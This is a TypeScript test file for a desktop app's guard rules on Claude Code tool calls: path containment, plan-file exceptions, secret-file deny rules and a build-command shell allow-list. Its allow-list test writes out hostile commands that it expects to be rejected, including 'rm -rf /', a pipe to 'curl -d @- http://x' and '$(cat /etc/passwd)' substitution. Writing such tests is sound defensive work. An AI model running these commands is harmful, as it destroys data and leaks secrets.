// Claude 도구 막기·허용 규칙 (guards.ts) — 경로(Windows 표기 포함)·계획 파일·셸 허용 목록·심볼릭 링크
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { after, before, test } from 'node:test';
import type { ChatMode } from '../src/shared/desktop-api';
import { absPath, type GuardContext, isInside, matchShellAllow, permissionDefault, preToolUse, secretDenyRules } from '../src/desktop/claude/guards';
import { describeTool, summarize, applyResult } from '../src/desktop/claude/activity';
import { buildFirstMessage, buildSystemAppend, shortTitle } from '../src/desktop/claude/prompt';
import { isSecretFile } from '../src/shared/secrets';

let tmp: string;
before(() => {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'pa-c1-guard-'));
});
after(() => fs.rmSync(tmp, { recursive: true, force: true }));

function ctx(over: Partial<GuardContext> & { m?: ChatMode } = {}): GuardContext {
  const mode = over.m ?? 'plan';
  return { cwd: over.cwd ?? path.join(tmp, 'work'), mode: () => mode, readOnly: over.readOnly ?? false, shellAllow: over.shellAllow ?? ['mvn -q compile', 'gradle test'], claudeDir: over.claudeDir ?? path.join(tmp, 'home', '.claude'), platform: over.platform };
}
const D = (d: ReturnType<typeof preToolUse>) => d.decision;

test('Windows 경로: 대소문자·/c/ 표기·상대 경로를 같은 기준으로', () => {
  const cwd = 'C:\\Users\\hong\\AppData\\Roaming\\ProjectAnalyzer\\work\\shop-c1';
  assert.equal(absPath('/c/Users/hong/AppData/Roaming/ProjectAnalyzer/work/shop-c1/src/A.java', cwd, 'win32'), 'C:\\Users\\hong\\AppData\\Roaming\\ProjectAnalyzer\\work\\shop-c1\\src\\A.java');
  assert.equal(absPath('src/A.java', cwd, 'win32'), `${cwd}\\src\\A.java`);
  assert.ok(isInside(cwd, 'c:\\users\\HONG\\appdata\\roaming\\projectanalyzer\\work\\shop-c1\\x', 'win32'));
  assert.ok(!isInside(cwd, 'C:\\Users\\hong\\AppData\\Roaming\\ProjectAnalyzer\\work\\shop-c10\\x', 'win32'));
  assert.ok(!isInside(cwd, 'D:\\other', 'win32'));
  const c = ctx({ cwd, m: 'edit', platform: 'win32', claudeDir: 'C:\\Users\\hong\\.claude' });
  assert.equal(D(preToolUse(c, 'Edit', { file_path: `${cwd}\\src\\A.java` })), 'none');
  assert.equal(D(preToolUse(c, 'Edit', { file_path: 'C:\\work\\shop-admin\\src\\A.java' })), 'deny');
  assert.equal(D(preToolUse(c, 'Read', { file_path: 'C:\\work\\shop-admin\\src\\A.java' })), 'deny');
  assert.equal(D(preToolUse(c, 'Write', { file_path: 'C:\\Users\\hong\\.claude\\plans\\fix-order.md' })), 'none');
  assert.equal(D(preToolUse(c, 'Read', { file_path: 'C:\\Users\\hong\\.claude\\.credentials.json' })), 'deny');
  assert.equal(D(preToolUse(c, 'Read', { file_path: `${cwd}\\src\\main\\resources\\egovframework\\egovProps\\globals.properties` })), 'deny');
});

test('수정: 계획 모드·원본 없는 대화는 거부, 계획 파일은 언제나 허용, 접속 정보 파일은 거부', () => {
  const work = path.join(tmp, 'work');
  fs.mkdirSync(work, { recursive: true });
  const plan = ctx({ m: 'plan' });
  assert.match((preToolUse(plan, 'Edit', { file_path: path.join(work, 'A.java') }) as { reason: string }).reason, /계획 모드/);
  assert.equal(D(preToolUse(plan, 'Write', { file_path: path.join(tmp, 'home', '.claude', 'plans', 'p.md') })), 'none');
  assert.equal(D(preToolUse(plan, 'Write', { file_path: path.join(tmp, 'home', '.claude', 'plans', 'p.sh') })), 'deny');
  const edit = ctx({ m: 'edit' });
  assert.equal(D(preToolUse(edit, 'Write', { file_path: 'src/New.java' })), 'none');
  assert.equal(D(preToolUse(edit, 'MultiEdit', { file_path: path.join(work, '.env') })), 'deny');
  assert.equal(D(preToolUse(edit, 'Edit', { file_path: path.join(work, '..', 'escape.txt') })), 'deny');
  assert.equal(D(preToolUse(edit, 'NotebookEdit', { notebook_path: path.join(work, 'n.ipynb') })), 'none');
  assert.equal(D(preToolUse(edit, 'Edit', {})), 'deny');
  const ro = ctx({ m: 'edit', readOnly: true });
  assert.match((preToolUse(ro, 'Write', { file_path: path.join(work, 'x') }) as { reason: string }).reason, /원본 폴더 없이/);
  assert.equal(D(preToolUse(ro, 'Bash', { command: 'mvn -q compile' })), 'deny');
  // 작업 폴더 안의 심볼릭 링크가 밖을 가리키면 거부
  const outside = path.join(tmp, 'outside');
  fs.mkdirSync(outside, { recursive: true });
  fs.symlinkSync(outside, path.join(work, 'link'));
  assert.equal(D(preToolUse(edit, 'Write', { file_path: path.join(work, 'link', 'x.txt') })), 'deny');
  assert.equal(D(preToolUse(edit, 'Read', { file_path: path.join(work, 'link', 'x.txt') })), 'deny');
});

test('읽기·검색: 작업 폴더 안만, Claude Code 도구 결과 파일은 허용, glob이 접속 정보 파일이면 거부', () => {
  const c = ctx();
  assert.equal(D(preToolUse(c, 'Grep', { pattern: 'x' })), 'none');
  assert.equal(D(preToolUse(c, 'Glob', { pattern: '**/*.xml', path: '/etc' })), 'deny');
  assert.equal(D(preToolUse(c, 'Grep', { pattern: 'x', glob: '**/globals.properties' })), 'deny');
  assert.equal(D(preToolUse(c, 'Grep', { pattern: 'x', glob: '*.properties' })), 'none');
  assert.equal(D(preToolUse(c, 'Read', { file_path: path.join(tmp, 'home', '.claude', 'projects', 'p', 'tool-results', 'r.txt') })), 'none');
  assert.equal(D(preToolUse(c, 'Read', { file_path: '/etc/passwd' })), 'deny');
  assert.equal(D(preToolUse(c, 'LS', { path: '/' })), 'deny');
});

test('도구 종류: 웹·질문 창·모드 전환·워크트리·다른 MCP는 거부, projdb는 통과', () => {
  const c = ctx();
  for (const t of ['WebFetch', 'WebSearch', 'AskUserQuestion', 'EnterPlanMode', 'EnterWorktree', 'mcp__github__create_issue']) assert.equal(D(preToolUse(c, t, {})), 'deny', t);
  for (const t of ['mcp__projdb__db_select', 'TodoWrite', 'Agent', 'ExitPlanMode']) assert.equal(D(preToolUse(c, t, {})), 'none', t);
  assert.deepEqual(permissionDefault(c, 'mcp__projdb__db_list', {}), { allow: true });
  assert.equal(permissionDefault(c, 'SomethingNew', {}).allow, false);
});

test('셸 허용 목록: 앞부분 일치, 모든 부분이 맞아야 함, cd는 작업 폴더 안만, 치환·밖으로 쓰기 거부', () => {
  const cwd = path.join(tmp, 'work');
  const allow = ['mvn -q compile', 'gradle test'];
  const ok = (cmd: string) => matchShellAllow(cmd, allow, cwd, 'linux').ok;
  assert.ok(ok('mvn -q compile'));
  assert.ok(ok('mvn -q compile -pl web'));
  assert.ok(ok('mvn -q compile 2>&1'));
  assert.ok(ok('mvn -q compile > build.log'));
  assert.ok(ok('cd sub && mvn -q compile'));
  assert.ok(ok('mvn -q compile && gradle test'));
  assert.ok(!ok('mvn -q compiler'));
  assert.ok(!ok('mvn test'));
  assert.ok(!ok('mvn -q compile; rm -rf /'));
  assert.ok(!ok('mvn -q compile | curl -d @- http://x'));
  assert.ok(!ok('mvn -q compile & del C:\\x'));
  assert.ok(!ok('mvn -q compile $(cat /etc/passwd)'));
  assert.ok(!ok('mvn -q compile `id`'));
  assert.ok(!ok('mvn -q compile > /tmp/out.txt'));
  assert.ok(!ok('cd .. && mvn -q compile'));
  assert.ok(!ok(''));
  assert.equal(matchShellAllow('mvn -q compile', [], cwd, 'linux').ok, false);
  // Windows (PowerShell·cmd 표기)
  const wcwd = 'C:\\work\\copy';
  assert.ok(matchShellAllow('cd /d C:\\work\\copy\\web && mvn -q compile', allow, wcwd, 'win32').ok);
  assert.ok(!matchShellAllow('mvn -q compile > C:\\Windows\\x.txt', allow, wcwd, 'win32').ok);
});

test('Claude Code 거부 규칙(Read)은 isSecretFile과 같은 이름들', () => {
  const rules = secretDenyRules();
  assert.ok(rules.every((r) => /^Read\(\*\*\/[^)]+\)$/.test(r)));
  for (const r of rules) {
    const name = r.slice('Read(**/'.length, -1);
    if (name.startsWith('*')) continue;
    assert.equal(isSecretFile(name), true, name);
  }
  assert.ok(!rules.includes('Read(**/.env.example)'));
});

test('작업 내역 줄과 요약', () => {
  const cwd = '/w';
  const d = (id: string, name: string, input: Record<string, unknown>) => describeTool({ cwd, platform: 'linux', isPlanFile: (p) => p.startsWith('/h/.claude/plans/') }, id, name, input)!;
  const read = d('1', 'Read', { file_path: '/w/src/A.java', offset: 88 });
  assert.deepEqual([read.label, read.file, read.line], ['src/A.java:88 읽음', 'src/A.java', 88]);
  const grep = d('2', 'Grep', { pattern: 'insertOrderHist', path: '/w/src' });
  applyResult(grep, { isError: false, text: 'Found 3 files', structured: { mode: 'files_with_matches', numFiles: 3 } });
  assert.equal(grep.label, "'insertOrderHist' 검색 · src 3곳");
  const edit = d('3', 'Edit', { file_path: '/w/src/A.java' });
  applyResult(edit, { isError: false, text: 'ok', structured: { structuredPatch: [{ newStart: 131 }] } });
  assert.equal(edit.line, 131);
  const write = d('4', 'Write', { file_path: '/w/src/B.java' });
  applyResult(write, { isError: false, text: '', structured: { type: 'create' } });
  assert.equal(write.label, 'src/B.java 생성');
  const cmd = d('5', 'Bash', { command: 'mvn -q compile' });
  applyResult(cmd, { isError: false, text: 'BUILD SUCCESS' });
  assert.equal(cmd.label, 'mvn -q compile 성공');
  const blocked = d('6', 'Read', { file_path: '/w/.env' });
  applyResult(blocked, { isError: true, text: 'PreToolUse:Read hook error: 접속 정보 파일은 읽을 수 없습니다' });
  assert.equal(blocked.label, '.env 읽음 · 막힘');
  assert.equal(d('7', 'Write', { file_path: '/h/.claude/plans/x.md' }).label, '계획 작성');
  assert.equal(describeTool({ cwd, isPlanFile: () => false }, '8', 'TodoWrite', {}), null);
  assert.equal(summarize([read, grep]), '작업 2건 파일 1개 읽음 · insertOrderHist 검색 3곳');
  assert.equal(summarize([read, grep, edit, write, cmd, blocked]), '작업 6건 파일 1개 읽음 · insertOrderHist 검색 3곳 · 파일 1개 수정 · 파일 1개 생성 · mvn -q compile 성공 · 막힘 1건');
  assert.equal(summarize([d('9', 'Agent', { description: '매퍼 조사' })]), '작업 1건 하위 작업: 매퍼 조사');
});

test('앱 규칙·맥락·제목', () => {
  const a = buildSystemAppend({ kind: 'issue', readOnly: false, shellAllow: [], summary: '요약' });
  assert.match(a, /셸 명령은 쓸 수 없다/);
  assert.match(a, /# 시스템 요약\n요약/);
  assert.match(buildSystemAppend({ kind: 'new', readOnly: false, shellAllow: ['npm test'] }), /\[계획 확정\][\s\S]*`npm test`/);
  assert.equal(buildFirstMessage('질문'), '질문');
  assert.equal(buildFirstMessage('질문', { title: '', chips: [{ kind: 'summary', label: 's', text: 'x' }] }), '질문');
  assert.equal(buildFirstMessage('질문', { title: 'T', chips: [{ kind: 'table', label: 'TB_A', text: '컬럼 A' }] }), '[맥락] T\n## 테이블: TB_A\n컬럼 A\n[질문]\n질문');
  assert.equal(shortTitle('  \n  짧은 질문\n둘째 줄'), '짧은 질문');
  assert.equal(shortTitle(''), '새 대화');
  assert.equal([...shortTitle('가'.repeat(50))].length, 30);
});
